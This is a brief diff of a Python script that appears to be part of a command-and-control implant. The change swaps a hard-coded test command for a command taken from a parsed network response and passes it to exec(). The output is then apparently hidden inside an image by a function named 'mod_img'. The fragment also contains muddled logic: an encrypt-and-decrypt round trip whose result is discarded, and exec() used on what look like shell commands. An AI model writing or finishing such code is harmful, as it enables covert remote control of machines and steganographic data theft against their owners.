@@ -113,7 +113,7 @@ if __name__ == '__main__':
             encrypted_cmd = parse_json(response) 
             cipher_text = encrypt("Testing testing 123~")
             cmd = decrypt(cipher_text) 
-            cmd = "ls -lah"
+            cmd = encrypted_cmd
             output = exec(cmd) 
             if output != "": 
                 obf_img = mod_img(output)
